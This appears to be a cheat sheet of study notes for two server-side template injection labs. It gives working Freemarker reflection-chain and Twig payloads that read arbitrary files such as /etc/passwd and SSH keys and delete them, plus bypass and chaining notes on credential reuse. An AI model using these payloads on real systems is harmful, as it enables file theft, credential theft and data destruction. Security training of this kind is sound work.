# SSTI — Sandbox escape and advanced exploitation

Two advanced primitives: (1) Java reflection chain to traverse from any exposed object to a static file-read method — works even in "sandboxed" Freemarker; (2) custom exploit via undocumented object methods — enumerate methods from errors, chain them to read/delete arbitrary files.

## Quick reference
```
# Java sandbox escape via reflection (Freemarker)
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
# Output: decimal ASCII bytes → convert to string

# Custom object method exploit (Twig/PHP)
# Step 1: map avatar to target file (get MIME error first, then add second arg)
user.setAvatar('/etc/passwd','image/jpg')
# Step 2: read it
GET /avatar?avatar=wiener  →  file contents returned

# Read source to find gdprDelete()
user.setAvatar('/home/carlos/User.php','image/jpg')

# Step 3: pivot — set carlos's file as avatar, then delete
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
user.gdprDelete()
```

## Root cause
**Sandbox escape:** Freemarker's "sandbox" restricts direct method calls but can't prevent Java's built-in reflection chain — `getClass()` is available on all Java objects. From there: `getProtectionDomain()` → `getCodeSource()` → `getLocation()` → `toURI()` → `resolve(path)` → `toURL()` → `openStream()` → `readAllBytes()`. Each method is in the Java standard library and can't be individually blocked without breaking the JVM.

**Custom exploit:** The application exposes a `user` object with privileged methods (`setAvatar`, `gdprDelete`). The developer wrote these for legitimate use but didn't expect them to be callable from template injection. SSTI + exposed privileged object = chained arbitrary file operations.

## Find it
**Sandbox:**
1. Log in, find template editor (product description, email template).
2. Confirm SSTI: `${product.getClass()}` → class name returned.
3. Start traversing the reflection chain: `getProtectionDomain()`, `getCodeSource()`, `getLocation()`.
4. Use Java `URI.resolve(path)` to point to target file.

**Custom exploit:**
1. Find SSTI in a display preference field (blog post author display name).
2. Upload an invalid image as avatar → error reveals `user.setAvatar()` method signature.
3. Note file paths mentioned in errors (e.g., `/home/carlos/User.php`).
4. Read that PHP file to discover `gdprDelete()` — maps what's deleteable.

## Technique
**Java sandbox escape:**
1. Log in → product description template editor.
2. Confirm object access: `${product.getClass()}` → class returned.
3. Build reflection chain step by step in Repeater:
   - `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()}`
   - Append: `.resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")`
4. Save template → page renders → response contains decimal ASCII bytes.
5. Convert byte array (space-separated decimals) to ASCII string → password.

**Custom exploit (Twig PHP):**
1. Change blog post author display name → SSTI field.
2. Upload invalid image → error reveals `user.setAvatar(filePath, mimeType)`.
3. `user.setAvatar('/etc/passwd','image/jpg')` → view comment page → template executes.
4. `GET /avatar?avatar=wiener` → returns `/etc/passwd` contents.
5. `user.setAvatar('/home/carlos/User.php','image/jpg')` → read source → find `gdprDelete()`.
6. `user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')` → maps carlos's key as your avatar.
7. Inject `user.gdprDelete()` into display name field → view comment → deletes carlos's file.

## Payload arsenal
```
# Java reflection — file read (decimal bytes output)
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}

# Convert decimal bytes to string (Python one-liner)
python3 -c "print(''.join(chr(int(x)) for x in '104 101 108 108 111'.split()))"

# Twig — set avatar to arbitrary file
user.setAvatar('/etc/passwd','image/jpg')
user.setAvatar('/home/carlos/User.php','image/jpg')
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')

# Read avatar (becomes file read)
GET /avatar?avatar=wiener

# Delete via gdprDelete
user.gdprDelete()

# Chain in one template injection:
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
# (view comment to execute setAvatar, then:)
user.gdprDelete()
# (view comment again to execute delete)
```

## Bypasses
| Defense | Bypass |
|---|---|
| Freemarker sandbox | Java reflection chain — `getClass()` can't be restricted |
| No direct exec | Pivot through `URI.resolve()` + `openStream().readAllBytes()` |
| No obvious methods | Upload bad image → error leaks method signatures |
| No direct file delete | `setAvatar(target)` then `gdprDelete()` → indirect delete |

## Labs

### Server-side template injection in a sandboxed environment [Expert]
Freemarker template editor with `product` object exposed. `${product.getClass()}` → Java class returned → reflection chain to `readAllBytes()`: `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`. Output is decimal bytes → convert to ASCII. Key insight: Java reflection chain bypasses any custom Freemarker sandbox because `getClass()` is always available.

### Server-side template injection with a custom exploit [Expert]
SSTI in blog author display name (Twig/PHP). Upload invalid image → error reveals `user.setAvatar(path,mime)`. Read `/home/carlos/User.php` → discovers `gdprDelete()` method. Chain: `user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')` → view comment (executes) → `user.gdprDelete()` → view comment again → deletes `/home/carlos/.ssh/id_rsa`. Key insight: discover hidden methods from errors → chain privileged object methods to perform arbitrary file operations.

## Chaining
- Java sandbox escape → read `/etc/passwd`, `/home/carlos/secret`, SSH keys → credential reuse
- Twig gdprDelete → arbitrary file deletion → application DoS / account lockout
- Read `User.php` or source code → discover more methods / internal paths
- SSTI + file read → read config files → database credentials → further lateral movement

## Real-world notes
- Java reflection chains: start from any exposed object → `getClass()` is always your entry point.
- Output as decimal bytes (`?join(" ")`) is Freemarker-specific — convert with `chr()`.
- Custom exploits require reading source code or triggering errors — don't skip the recon step.
- `gdprDelete` pattern: any "cleanup" method on user objects is likely performing privileged file ops.

## References
- https://portswigger.net/web-security/server-side-template-injection/exploiting
